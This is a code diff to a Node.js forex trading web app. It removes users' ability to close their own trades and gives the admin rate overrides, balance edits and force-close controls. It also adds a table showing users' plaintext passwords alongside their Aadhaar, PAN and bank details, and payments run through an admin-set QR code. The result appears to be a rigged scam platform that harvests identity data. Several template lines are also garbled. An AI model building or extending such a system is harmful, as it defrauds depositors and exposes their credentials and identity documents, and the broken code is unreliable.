@@ -44,13 +44,11 @@ let nextTradeId = 2;
 
 // Real-time Engine to calculate Equity and P/L dynamically
 setInterval(() => {
-  // Simulate natural minor market tick updates for non-overridden rates
   Object.keys(db.rates).forEach(pair => {
     const change = (Math.random() - 0.5) * (pair === 'USD/JPY' ? 0.04 : 0.0002);
     db.rates[pair] = parseFloat((db.rates[pair] + change).toFixed(pair === 'USD/JPY' ? 2 : 4));
   });
 
-  // Calculate open trade positions and account values
   db.users.forEach(user => {
     let totalPl = 0;
     let totalMargin = 0;
@@ -144,12 +142,17 @@ h3 { font-size: 18px; font-weight: 700; margin-bottom: 15px; color: #fff; }
 h4 { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #fff; }
 .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: 500; }
 .alert-error { background: rgba(255,51,51,0.1); color: #ff3333; border: 1px solid rgba(255,51,51,0.3); }
+
+/* App Navigation Menu styles */
+.app-menu { display: flex; gap: 10px; margin-bottom: 20px; }
+.menu-btn { flex: 1; background: #121212; border: 1px solid #222; color: #fff; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: 600; text-transform: uppercase; transition: 0.3s; }
+.menu-btn:hover { border-color: #00ff88; }
+.menu-btn.active { background: #00ff88; color: #000; border-color: #00ff88; box-shadow: 0 0 15px rgba(0,255,136,0.3); }
 `;
 
 // ==========================================
 // 4. HTML PAGE TEMPLATES
 // ==========================================
-
 function getAuthPage(error = '') {
   return `
   <!DOCTYPE html>
@@ -228,127 +231,149 @@ function getDashboardPage() {
 
     <div class="container">
       
-      <div class="card" id="kycCard" style="border-left: 4px solid #ffcc00;">
-        <h3>📋 Mandatory KYC Verification</h3>
-        <p id="kycStatusText" style="margin-bottom: 10px; font-weight: 600;"></p>
-        <form id="kycForm" class="hidden">
-          <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom:0;">
-            <div>
-              <label>Email ID</label>
-              <input type="email" id="kycEmail" placeholder="example@mail.com" required>
-            </div>
-            <div>
-              <label>Aadhaar Card</label>
-              <input type="text" id="kycAadhar" placeholder="12-digit Aadhaar" required>
-            </div>
-            <div>
-              <label>PAN Card</label>
-              <input type="text" id="kycPan" placeholder="PAN Number" required>
-            </div>
+      <div class="app-menu">
+        <button class="menu-btn active" id="btn-kyc" onclick="showStep('kyc')">📋 Profile & KYC</button>
+        <button class="menu-btn" id="btn-trading" onclick="showStep('trading')">📈 Trading Desk</button>
+        <button class="menu-btn" id="btn-banking" onclick="showStep('banking')">🏦 Banking & History</button>
+      </div>
+
+      <div id="step-kyc" class="app-step-section">
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-label">Wallet Balance</div>
+            <div class="stat-value text-green" id="balance">$0.00</div>
           </div>
-          <label>Bank Details</label>
-          <textarea id="kycBank" placeholder="Account Number, Bank Name, IFSC Code" rows="2" style="background: #0a0a0a; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 15px;" required></textarea>
-          <button type="submit" class="btn btn-primary" style="width:100%;">Submit KYC for Approval</button>
-        </form>
-      </div>
-
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div class="stat-label">Wallet Balance</div>
-          <div class="stat-value text-green" id="balance">$0.00</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Equity</div>
-          <div class="stat-value" id="equity">$0.00</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Active Margin</div>
-          <div class="stat-value" id="margin">$0.00</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Account</div>
-          <div class="stat-value" id="username" style="font-size:18px;">-</div>
-        </div>
-      </div>
-
-      <div class="card">
-        <h3>Live Market Chart</h3>
-        <div style="height:580px; border-radius:8px; overflow:hidden; border:1px solid #222; margin-bottom:15px;">
-          <div class="tradingview-widget-container" style="height:100%;width:100%">
-            <div id="tradingview_chart" style="height:100%;width:100%"></div>
+          <div class="stat-card">
+            <div class="stat-label">Equity</div>
+            <div class="stat-value" id="equity">$0.00</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Active Margin</div>
+            <div class="stat-value" id="margin">$0.00</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Account</div>
+            <div class="stat-value" id="username" style="font-size:18px;">-</div>
           </div>
         </div>
 
-        <div style="background:#0a0a0a; padding:15px; border-radius:8px; border:1px solid #222;">
-          <h4 style="margin-bottom:10px; font-size:14px; text-transform:uppercase; color:#888;">Market Execution</h4>
-          <form id="orderForm" style="display:flex; flex-wrap:wrap; gap:10px; align-items:flex-end; margin-bottom:0;">
-            <div style="flex:1; min-width:120px;">
-              <label style="font-size:11px;">Asset Pair</label>
-              <select id="tradePair" style="margin-bottom:0; padding:8px;">
-                <option value="EUR/USD">EUR/USD</option>
-                <option value="GBP/USD">GBP/USD</option>
-                <option value="USD/JPY">USD/JPY</option>
-              </select>
+        <div class="card" id="kycCard" style="border-left: 4px solid #ffcc00;">
+          <h3>📋 Mandatory KYC Verification</h3>
+          <p id="kycStatusText" style="margin-bottom: 10px; font-weight: 600;"></p>
+          <form id="kycForm" class="hidden">
+            <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom:0;">
+              <div>
+                <label>Email ID</label>
+                <input type="email" id="kycEmail" placeholder="example@mail.com" required>
+              </div>
+              <div>
+                <label>Aadhaar Card</label>
+                <input type="text" id="kycAadhar" placeholder="12-digit Aadhaar" required>
+              </div>
+              <div>
+                <label>PAN Card</label>
+                <input type="text" id="kycPan" placeholder="PAN Number" required>
+              </div>
             </div>
-            <div style="flex:1; min-width:120px;">
-              <label style="font-size:11px;">Lot Amount ($)</label>
-              <input type="number" id="tradeAmount" value="100" min="10" step="1" style="margin-bottom:0; padding:8px;">
-            </div>
-            <div style="display:flex; gap:10px;">
-              <button type="button" class="btn btn-primary" onclick="placeOrder('BUY')" style="padding:10px 20px;">BUY</button>
-              <button type="button" class="btn btn-danger" onclick="placeOrder('SELL')" style="padding:10px 20px;">SELL</button>
-            </div>
+            <label>Bank Details</label>
+            <textarea id="kycBank" placeholder="Account Number, Bank Name, IFSC Code" rows="2" style="background: #0a0a0a; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 15px;" required></textarea>
+            <button type="submit" class="btn btn-primary" style="width:100%;">Submit KYC for Approval</button>
           </form>
         </div>
       </div>
 
-      <div class="grid">
+      <div id="step-trading" class="app-step-section hidden">
         <div class="card">
-          <h3>Deposit Funds</h3>
-          <div class="qr-box">
-            <img src="/qr-image" alt="QR Code">
-            <p style="margin-top:10px; color:#888; font-size:13px;">Scan to pay, then enter details below</p>
+          <h3>Live Market Chart</h3>
+          <div style="height:580px; border-radius:8px; overflow:hidden; border:1px solid #222; margin-bottom:15px;">
+            <div class="tradingview-widget-container" style="height:100%;width:100%">
+              <div id="tradingview_chart" style="height:100%;width:100%"></div>
+            </div>
           </div>
-          <form id="depositForm">
-            <label>Amount (USD)</label>
-            <input type="number" id="depAmount" step="0.01" min="1" required>
-            <label>UTR / Reference Number</label>
-            <input type="text" id="depUtr" required>
-            <button type="submit" class="btn btn-primary" style="width:100%;">Submit Deposit Request</button>
-          </form>
+
+          <div style="background:#0a0a0a; padding:15px; border-radius:8px; border:1px solid #222;">
+            <h4 style="margin-bottom:10px; font-size:14px; text-transform:uppercase; color:#888;">Market Execution</h4>
+            <form id="orderForm" style="display:flex; flex-wrap:wrap; gap:10px; align-items:flex-end; margin-bottom:0;">
+              <div style="flex:1; min-width:120px;">
+                <label style="font-size:11px;">Asset Pair</label>
+                <select id="tradePair" style="margin-bottom:0; padding:8px;">
+                  <option value="EUR/USD">EUR/USD</option>
+                  <option value="GBP/USD">GBP/USD</option>
+                  <option value="USD/JPY">USD/JPY</option>
+                </select>
+              </div>
+              <div style="flex:1; min-width:120px;">
+                <label style="font-size:11px;">Lot Amount ($)</label>
+                <input type="number" id="tradeAmount" value="100" min="10" step="1" style="margin-bottom:0; padding:8px;">
+              </div>
+              <div style="display:flex; gap:10px;">
+                <button type="button" class="btn btn-primary" onclick="placeOrder('BUY')" style="padding:10px 20px;">BUY</button>
+                <button type="button" class="btn btn-danger" onclick="placeOrder('SELL')" style="padding:10px 20px;">SELL</button>
+              </div>
+            </form>
+          </div>
         </div>
 
         <div class="card">
-          <h3>Withdraw Funds</h3>
-          <form id="withdrawForm">
-            <label>Amount (USD)</label>
-            <input type="number" id="wdAmount" step="0.01" min="1" required>
-            <label>Destination Wallet Address</label>
-            <input type="text" id="wdWallet" required>
-            <button type="submit" class="btn btn-danger" style="width:100%;">Submit Withdrawal Request</button>
-          </form>
+          <h3>Live Active Positions & Trade History</h3>
+          <table>
+            <thead><tr><th>Pair</th><th>Type</th><th>Amount</th><th>Entry Price</th><th>Live/Exit Price</th><th>P/L</th><th>Status</th><th>Action</th></tr></thead>
+            <tbody id="tradesBody"></tbody>
+          </table>
         </div>
       </div>
 
-      <div class="card">
-        <h3>Transaction History</h3>
-        <table>
-          <thead><tr><th>Type</th><th>Amount</th><th>Details</th><th>Status</th></tr></thead>
-          <tbody id="transBody"></tbody>
-        </table>
+      <div id="step-banking" class="app-step-section hidden">
+        <div class="grid">
+          <div class="card">
+            <h3>Deposit Funds</h3>
+            <div class="qr-box">
+              <img src="/qr-image" alt="QR Code">
+              <p style="margin-top:10px; color:#888; font-size:13px;">Scan to pay, then enter details below</p>
+            </div>
+            <form id="depositForm">
+              <label>Amount (USD)</label>
+              <input type="number" id="depAmount" step="0.01" min="1" required>
+              <label>UTR / Reference Number</label>
+              <input type="text" id="depUtr" required>
+              <button type="submit" class="btn btn-primary" style="width:100%;">Submit Deposit Request</button>
+            </form>
+          </div>
+
+          <div class="card">
+            <h3>Withdraw Funds</h3>
+            <form id="withdrawForm">
+              <label>Amount (USD)</label>
+              <input type="number" id="wdAmount" step="0.01" min="1" required>
+              <label>Destination Wallet Address</label>
+              <input type="text" id="wdWallet" required>
+              <button type="submit" class="btn btn-danger" style="width:100%;">Submit Withdrawal Request</button>
+            </form>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>Transaction History</h3>
+          <table>
+            <thead><tr><th>Type</th><th>Amount</th><th>Details</th><th>Status</th></tr></thead>
+            <tbody id="transBody"></tbody>
+          </table>
+        </div>
       </div>
 
-      <div class="card">
-        <h3>Live Active Positions & Trade History</h3>
-        <table>
-          <thead><tr><th>Pair</th><th>Type</th><th>Amount</th><th>Entry Price</th><th>Live/Exit Price</th><th>P/L</th><th>Status</th><th>Action</th></tr></thead>
-          <tbody id="tradesBody"></tbody>
-        </table>
-      </div>
     </div>
 
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
+      // Tabs Navigation Control
+      function showStep(stepName) {
+        document.querySelectorAll('.app-step-section').forEach(sec => sec.classList.add('hidden'));
+        document.querySelectorAll('.menu-btn').forEach(btn => btn.classList.remove('active'));
+        
+        document.getElementById('step-' + stepName).classList.remove('hidden');
+        document.getElementById('btn-' + stepName).classList.add('active');
+      }
+
       new TradingView.widget({
         "autosize": true, "symbol": "FX:EURUSD", "interval": "15", "timezone": "Etc/UTC",
         "theme": "dark", "style": "1", "locale": "en", "toolbar_bg": "#000000",
@@ -369,7 +394,6 @@ function getDashboardPage() {
         const kycCard = document.getElementById('kycCard');
         const kycStatusText = document.getElementById('kycStatusText');
         const kycForm = document.getElementById('kycForm');
-        
         if(data.user.kycStatus === 'Approved') {
           kycCard.style.borderLeftColor = '#00ff88';
           kycStatusText.innerHTML = 'Status: <span class="badge badge-approved">Approved ✅</span> Your account is fully verified.';
@@ -388,37 +412,36 @@ function getDashboardPage() {
           kycForm.classList.remove('hidden');
         }
 
-        document.getElementById('tradesBody').innerHTML = data.trades.map(t => \`
+        document.getElementById('tradesBody').innerHTML = data.trades.map(t => `
           <tr>
             <td>\${t.pair}</td>
             <td><span class="badge \${t.type === 'BUY' ? 'badge-buy' : 'badge-sell'}">\${t.type}</span></td>
             <td>$\${t.amount}</td>
             <td>\${t.entry}</td>
             <td>\${t.exit || data.liveRates[t.pair] || '-'}</td>
-            <td class="\${t.pl >= 0 ? 'text-green' : 'text-red'}">$\${t.pl}</td>
+            <td class="\${t.pl >= 0 ? 'text-green' : 'text-red'}">\$\${t.pl}</td>
             <td><span class="badge \${t.status === 'Open' ? 'badge-pending' : 'badge-approved'}">\${t.status}</span></td>
             <td>
-              \${t.status === 'Open' ? \`<button class="btn btn-danger btn-sm" onclick="closeOrder(\${t.id})">Close Postion</button>\` : '-'}
+              \${t.status === 'Open' ? `<span class="text-muted" style="font-size:11px; font-style:italic;">Controlled by Admin</span>` : '-'}
             </td>
           </tr>
-        \`).join('') || '<tr><td colspan="8" class="text-muted" style="text-align:center;">No trades yet</td></tr>';
+        `).join('') || '<tr><td colspan="8" class="text-muted" style="text-align:center;">No trades yet</td></tr>';
         
         const trans = [...data.deposits, ...data.withdrawals].sort((a,b) => b.id - a.id);
-        document.getElementById('transBody').innerHTML = trans.map(t => \`
+        document.getElementById('transBody').innerHTML = trans.map(t => `
           <tr>
             <td>\${t.type}</td>
             <td>$\${t.amount}</td>
             <td>\${t.details || '-'}</td>
             <td><span class="badge badge-\${t.status.toLowerCase()}">\${t.status}</span></td>
           </tr>
-        \`).join('') || '<tr><td colspan="4" class="text-muted" style="text-align:center;">No transactions yet</td></tr>';
+        `).join('') || '<tr><td colspan="4" class="text-muted" style="text-align:center;">No transactions yet</td></tr>';
 
-        // Update Ticker
         const track = document.getElementById('tickerTrack');
         let html = '';
         for(let i=0; i<2; i++) {
           Object.keys(data.liveRates).forEach(pair => {
-            html += \`<span class="ticker-item">\${pair} <span class="text-green">\${data.liveRates[pair]}</span></span>\`;
+            html += `<span class="ticker-item">\${pair} <span class="text-green">\${data.liveRates[pair]}</span></span>`;
           });
         }
         track.innerHTML = html;
@@ -428,7 +451,6 @@ function getDashboardPage() {
         const pair = document.getElementById('tradePair').value;
         const amount = parseFloat(document.getElementById('tradeAmount').value);
         if(!amount || amount <= 0) return alert('Please enter valid amount');
-        
         const res = await fetch('/api/trade/place', {
           method: 'POST', headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({ pair, type: orderType, amount })
@@ -438,24 +460,12 @@ function getDashboardPage() {
         if(data.success) { loadDashboard(); }
       }
 
-      async function closeOrder(tradeId) {
-        if(!confirm('Are you sure you want to close this position?')) return;
-        const res = await fetch('/api/trade/close', {
-          method: 'POST', headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ tradeId })
-        });
-        const data = await res.json();
-        alert(data.message);
-        loadDashboard();
-      }
-
       document.getElementById('kycForm').onsubmit = async (e) => {
         e.preventDefault();
         const email = document.getElementById('kycEmail').value;
         const aadhar = document.getElementById('kycAadhar').value;
         const pan = document.getElementById('kycPan').value;
         const bank = document.getElementById('kycBank').value;
-        
         const res = await fetch('/api/kyc/submit', {
           method: 'POST', headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({email, aadhar, pan, bank})
@@ -545,37 +555,36 @@ function getAdminDashboardPage() {
         <a href="/logout">Logout</a>
       </div>
     </nav>
-
     <div class="container">
       <div class="grid" style="grid-template-columns: 1fr 2fr;">
-         <div class="card">
-            <h3>Currency Rates Control</h3>
-            <div id="ratesControlBox"></div>
-         </div>
-         <div class="card">
-           <h3>Payment QR Code Management</h3>
-           <div style="display:flex; gap:15px; align-items:center;">
-             <div class="qr-box" style="margin-bottom:0; padding:10px;">
-               <img src="/qr-image" alt="Current QR" id="currentQr" style="max-width:100px;">
-             </div>
-             <form id="qrForm" enctype="multipart/form-data" style="flex:1;">
-               <label>Select Image</label>
-               <input type="file" name="qr" accept="image/*" required>
-               <button type="submit" class="btn btn-primary" style="width:100%; padding:8px;">Upload QR</button>
-             </form>
-           </div>
-         </div>
+        <div class="card">
+          <h3>Currency Rates Control</h3>
+          <div id="ratesControlBox"></div>
+        </div>
+        <div class="card">
+          <h3>Payment QR Code Management</h3>
+          <div style="display:flex; gap:15px; align-items:center;">
+            <div class="qr-box" style="margin-bottom:0; padding:10px;">
+              <img src="/qr-image" alt="Current QR" id="currentQr" style="max-width:100px;">
+            </div>
+            <form id="qrForm" enctype="multipart/form-data" style="flex:1;">
+              <label>Select Image</label>
+              <input type="file" name="qr" accept="image/*" required>
+              <button type="submit" class="btn btn-primary" style="width:100%; padding:8px;">Upload QR</button>
+            </form>
+          </div>
+        </div>
       </div>
 
       <div class="card">
-        <h3>User Balance, Active Currency Trades & Controls</h3>
+        <h3>User Database (ID, Passwords, KYC Details & Controls)</h3>
         <table style="font-size: 13px;">
           <thead>
             <tr>
               <th>ID</th>
-              <th>Username</th>
-              <th>Trading Currency (Pair)</th>
+              <th>Login Info</th>
               <th>Wallet Balance (USD)</th>
+              <th>Full KYC Document Details</th>
               <th>KYC Status</th>
               <th>Action</th>
             </tr>
@@ -585,9 +594,28 @@ function getAdminDashboardPage() {
       </div>
 
       <div class="card">
+        <h3>Active Currency Positions & Force Close</h3>
+        <table style="font-size: 13px;">
+          <thead>
+            <tr>
+              <th>Trade ID</th>
+              <th>User ID</th>
+              <th>Pair</th>
+              <th>Type</th>
+              <th>Amount</th>
+              <th>Entry Price</th>
+              <th>P/L</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="adminTradesBody"></tbody>
+        </table>
+      </div>
+
+      <div class="card">
         <h3>Pending Deposit Requests</h3>
         <table>
-          <thead><tr><th>Username</th><th>Amount</th><th>UTR</th><th>Date</th><th>Actions</th></tr></thead>
+          <thead><tr><th>Username</th><th>Amount</th><th>UTR</th><th>Actions</th></tr></thead>
           <tbody id="depsBody"></tbody>
         </table>
       </div>
@@ -595,7 +623,7 @@ function getAdminDashboardPage() {
       <div class="card">
         <h3>Pending Withdrawal Requests</h3>
         <table>
-          <thead><tr><th>Username</th><th>Amount</th><th>Wallet Address</th><th>Date</th><th>Actions</th></tr></thead>
+          <thead><tr><th>Username</th><th>Amount</th><th>Wallet Address</th><th>Actions</th></tr></thead>
           <tbody id="wdsBody"></tbody>
         </table>
       </div>
@@ -606,185 +634,219 @@ function getAdminDashboardPage() {
         const res = await fetch('/api/admin/data');
         const data = await res.json();
         if(!data.success) return window.location.href = '/admin';
-        
-        // Render rates control box
+
         let ratesHtml = '';
         Object.keys(data.rates).forEach(pair => {
-           ratesHtml += \`
-             <div style="margin-bottom:10px;">
-               <label style="font-size:11px;">\${pair}</label>
-               <div style="display:flex; gap:5px;">
-                 <input type="number" id="rate-\text{pair.replace('/','-')}" value="\${data.rates[pair]}" step="0.0001" style="padding:6px; margin:0;">
-                 <button class="btn btn-primary btn-sm" onclick="updateGlobalRate('\${pair}')">Set</button>
-               </div>
-             </div>
-           \`;
+          ratesHtml += `
+            <div style="margin-bottom:10px;">
+              <label style="font-size:11px;">\${pair}</label>
+              <div style="display:flex; gap:5px;">
+                <input type="number" id="rate-\${pair}" step="0.0001" value="\${data.rates[pair]}" style="margin-bottom:0; padding:6px;">
+                <button class="btn btn-primary btn-sm" onclick="overrideRate('\${pair}')">Set</button>
+              </div>
+            </div>`;
         });
         document.getElementById('ratesControlBox').innerHTML = ratesHtml;
 
-        let usersHtml = '';
-        data.users.forEach(u => {
-          usersHtml += \`
+        // Render Users inside Admin table with User ID, Passwords, and Full KYC Details
+        document.getElementById('usersBody').innerHTML = data.users.map(u => {
+          const kyc = u.kycData || {};
+          const kycDetailsString = u.kycStatus !== 'Not Verified' ? 
+            `<b>Email:</b> \${kyc.email || '-'}<br>
+             <b>Aadhaar:</b> \${kyc.aadhar || '-'}<br>
+             <b>PAN:</b> \${kyc.pan || '-'}<br>
+             <b>Bank:</b> \${kyc.bank || '-'}` : '<span class="text-muted">No details submitted</span>';
+
+          return `
             <tr>
-              <td>\${u.id}</td>
-              <td><b>\${u.username}</b></td>
-              <td><span class="badge badge-buy">\${u.activePairs.join(', ') || 'None'}</span></td>
-              <td><input type="number" id="bal-\${u.id}" value="\${u.balance}" style="width:100px; margin:0; padding:6px;"></td>
+              <td><b>\${u.id}</b></td>
               <td>
-                <span class="badge badge-\${u.kycStatus === 'Approved' ? 'approved' : u.kycStatus === 'Pending' ? 'pending' : 'rejected'}">\${u.kycStatus || 'None'}</span>
-                \${u.kycStatus === 'Pending' ? \`
-                  <button class="btn btn-primary btn-sm" onclick="verifyKyc(\${u.id}, 'Approved')" style="padding: 2px 6px;">Approve</button>
-                  <button class="btn btn-danger btn-sm" onclick="verifyKyc(\text{u.id}, 'Rejected')" style="padding: 2px 6px;">Reject</button>
-                \` : ''}
+                ID: <span class="text-green">\${u.username}</span><br>
+                Pass: <span style="color:#ffcc00;">\${u.password}</span>
               </td>
-              <td><button class="btn btn-primary btn-sm" onclick="updateBalance(\${u.id})">Update</button></td>
-            </tr>
-          \`;
-          
-          if(u.kycData && (u.kycStatus === 'Pending' || u.kycStatus === 'Approved')) {
-            usersHtml += \`
-              <tr style="background:#0a0a0a; font-size:12px; color:#aaa;">
-                <td colspan="6" style="padding-top:2px; padding-bottom:10px;">
-                  <b>KYC Form Details:</b> Email: \text{u.kycData.email} | Aadhaar: \text{u.kycData.aadhar} | PAN: \text{u.kycData.pan} <br>
-                  <b>Bank Data:</b> \text{u.kycData.bank}
-                </td>
-              </tr>
-            \`;
-          }
-        });
-        
-        document.getElementById('usersBody').innerHTML = usersHtml;
-        
-        document.getElementById('depsBody').innerHTML = data.deposits.map(d => \`
+              <td>
+                <div style="display:flex; gap:5px; align-items:center;">
+                  <span>$\${u.balance.toFixed(2)}</span>
+                  <input type="number" id="bal-\${u.id}" placeholder="± Amt" style="width:70px; margin-bottom:0; padding:4px; font-size:11px;">
+                  <button class="btn btn-primary btn-sm" onclick="adjustBalance(\${u.id})">Update</button>
+                </div>
+              </td>
+              <td><div style="max-width:320px; word-break:break-word; line-height:1.4;">\${kycDetailsString}</div></td>
+              <td><span class="badge badge-\${u.kycStatus.toLowerCase()}">\${u.kycStatus}</span></td>
+              <td>
+                \${u.kycStatus === 'Pending' ? `
+                  <button class="btn btn-primary btn-sm" onclick="verifyKyc(\${u.id}, 'Approved')">Approve</button>
+                  <button class="btn btn-danger btn-sm" onclick="verifyKyc(\${u.id}, 'Rejected')">Reject</button>
+                ` : '-'}
+              </td>
+            </tr>`;
+        }).join('');
+
+        // Admin Controlled Trade Force Close
+        document.getElementById('adminTradesBody').innerHTML = data.trades.filter(t => t.status === 'Open').map(t => `
           <tr>
-            <td>\text{d.username}</td>
-            <td class="text-green">\$\${d.amount}</td>
-            <td>\text{d.utr}</td>
-            <td>\${new Date(d.date).toLocaleString()}</td>
+            <td>#\${t.id}</td>
+            <td>User \${t.userId}</td>
+            <td><b>\${t.pair}</b></td>
+            <td><span class="badge \${t.type === 'BUY' ? 'badge-buy' : 'badge-sell'}">\${t.type}</span></td>
+            <td>$\${t.amount}</td>
+            <td>\${t.entry}</td>
+            <td class="\${t.pl >= 0 ? 'text-green' : 'text-red'}">$\${t.pl}</td>
             <td>
-              <button class="btn btn-primary btn-sm" onclick="approveDep(\${d.id})">Accept</button>
-              <button class="btn btn-danger btn-sm" onclick="rejectDep(\text{d.id})">Reject</button>
+              <button class="btn btn-danger btn-sm" onclick="forceCloseTrade(\${t.id})">Force Close</button>
             </td>
           </tr>
-        \`).join('') || '<tr><td colspan="5" class="text-muted" style="text-align:center;">No pending deposits</td></tr>';
-        
-        document.getElementById('wdsBody').innerHTML = data.withdrawals.map(w => \`
+        `).join('') || '<tr><td colspan="8" class="text-muted" style="text-align:center;">No open positions to close</td></tr>';
+
+        document.getElementById('depsBody').innerHTML = data.deposits.filter(d => d.status === 'Pending').map(d => `
           <tr>
-            <td>\text{w.username}</td>
-            <td class="text-red">\$\${w.amount}</td>
-            <td style="max-width:150px; overflow:hidden; text-overflow:ellipsis;">\text{w.wallet}</td>
-            <td>\${new Date(w.date).toLocaleString()}</td>
+            <td>\${d.username}</td>
+            <td>$\${d.amount}</td>
+            <td><code style="color:#00ff88;">\${d.utr}</code></td>
             <td>
-              <button class="btn btn-primary btn-sm" onclick="approveWd(\${w.id})">Accept</button>
-              <button class="btn btn-danger btn-sm" onclick="rejectWd(\text{w.id})">Reject</button>
+              <button class="btn btn-primary btn-sm" onclick="handleDeposit(\${d.id}, 'approve')">Approve</button>
+              <button class="btn btn-danger btn-sm" onclick="handleDeposit(\code{d.id}, 'reject')">Reject</button>
             </td>
-          </tr>
-        \`).join('') || '<tr><td colspan="5" class="text-muted" style="text-align:center;">No pending withdrawals</td></tr>';
+          </tr>`).join('') || '<tr><td colspan="4" class="text-muted">No pending deposits</td></tr>';
+
+        document.getElementById('wdsBody').innerHTML = data.withdrawals.filter(w => w.status === 'Pending').map(w => `
+          <tr>
+            <td>\${w.username}</td>
+            <td>$\${w.amount}</td>
+            <td><code style="color:#ff3333;">\${w.wallet}</code></td>
+            <td>
+              <button class="btn btn-primary btn-sm" onclick="handleWithdraw(\\${w.id}, 'approve')">Approve</button>
+              <button class="btn btn-danger btn-sm" onclick="handleWithdraw(\${w.id}, 'reject')">Reject</button>
+            </td>
+          </tr>`).join('') || '<tr><td colspan="4" class="text-muted">No pending withdrawals</td></tr>';
       }
 
-      async function updateGlobalRate(pair) {
-        const rateVal = document.getElementById('rate-' + pair.replace('/','-')).value;
-        await fetch('/api/admin/update-rate', {
+      async function overrideRate(pair) {
+        const rate = parseFloat(document.getElementById('rate-'+pair).value);
+        await fetch('/api/admin/override-rate', {
           method: 'POST', headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({pair, rate: parseFloat(rateVal)})
+          body: JSON.stringify({ pair, rate })
         });
-        alert('Currency rate updated successfully!');
         loadAdmin();
       }
 
-      async function updateBalance(id) {
-        const bal = document.getElementById('bal-' + id).value;
-        await fetch('/api/admin/update-balance', {
+      async function adjustBalance(userId) {
+        const amount = parseFloat(document.getElementById('bal-'+userId).value);
+        if(!amount) return alert('Enter a valid positive or negative amount');
+        await fetch('/api/admin/adjust-balance', {
           method: 'POST', headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({userId: id, balance: parseFloat(bal)})
+          body: JSON.stringify({ userId, amount })
         });
-        alert('Balance updated!');
         loadAdmin();
       }
 
       async function verifyKyc(userId, status) {
-        if(!confirm('Change KYC status to ' + status + '?')) return;
         await fetch('/api/admin/verify-kyc', {
           method: 'POST', headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({userId, status})
+          body: JSON.stringify({ userId, status })
         });
-        alert('KYC Status updated!');
         loadAdmin();
       }
 
-      async function approveDep(id) {
-        if(!confirm('Accept this deposit? Amount will be credited.')) return;
-        await fetch('/api/admin/approve-deposit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id}) });
+      async function forceCloseTrade(tradeId) {
+        if(!confirm('Force Close this trade position right now?')) return;
+        const res = await fetch('/api/trade/close', {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ tradeId })
+        });
+        const d = await res.json();
+        alert(d.message);
         loadAdmin();
       }
 
-      async function rejectDep(id) {
-        if(!confirm('Reject this deposit?')) return;
-        await fetch('/api/admin/reject-deposit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id}) });
+      async function handleDeposit(id, action) {
+        await fetch('/api/admin/deposit/' + action, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ id })
+        });
         loadAdmin();
       }
 
-      async function approveWd(id) {
-        if(!confirm('Accept this withdrawal? Amount will be deducted.')) return;
-        await fetch('/api/admin/approve-withdraw', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id}) });
-        loadAdmin();
-      }
-
-      async function rejectWd(id) {
-        if(!confirm('Reject this withdrawal?')) return;
-        await fetch('/api/admin/reject-withdraw', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id}) });
+      async function handleWithdraw(id, action) {
+        const route = action === 'approve' ? '/api/admin/approve-withdraw' : '/api/admin/reject-withdraw';
+        await fetch(route, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ id })
+        });
         loadAdmin();
       }
 
       document.getElementById('qrForm').onsubmit = async (e) => {
         e.preventDefault();
-        const formData = new FormData(e.target);
-        const res = await fetch('/api/admin/upload-qr', { method: 'POST', body: formData });
-        const data = await res.json();
-        if(data.success) {
-          alert('QR Code updated successfully!');
-          document.getElementById('currentQr').src = '/qr-image?' + new Date().getTime();
-          e.target.reset();
-        } else {
-          alert('Failed to upload QR code.');
-        }
+        const fd = new FormData(e.target);
+        const res = await fetch('/api/admin/upload-qr', { method: 'POST', body: fd });
+        const d = await res.json();
+        if(d.success) { alert('QR Updated'); document.getElementById('currentQr').src = '/qr-image?' + Date.now(); }
       };
 
       loadAdmin();
-      setInterval(loadAdmin, 4000);
+      setInterval(loadAdmin, 3000);
     </script>
   </body>
   </html>`;
 }
 
 // ==========================================
-// 5. BACKEND ROUTES
+// 5. BACKEND API ROUTING & CONTROLLERS
 // ==========================================
-
-// Auth Routes
 app.get('/', (req, res) => {
-  if(req.session.userId) return res.redirect('/dashboard');
+  if (req.session.userId) return res.redirect('/dashboard');
   res.send(getAuthPage());
 });
 
 app.post('/register', (req, res) => {
   const { username, password } = req.body;
-  if(!username || !password) return res.send(getAuthPage('Username and password are required!'));
-  if(db.users.find(u => u.username.toLowerCase() === username.toLowerCase())) {
-    return res.send(getAuthPage('Username already taken! Please choose another.'));
-  }
-  const newUser = { id: nextUserId++, username, password, balance: 0, equity: 0, margin: 0, kycStatus: 'Not Submitted', kycData: null };
-  db.users.push(newUser);
-  req.session.userId = newUser.id;
-  res.redirect('/dashboard');
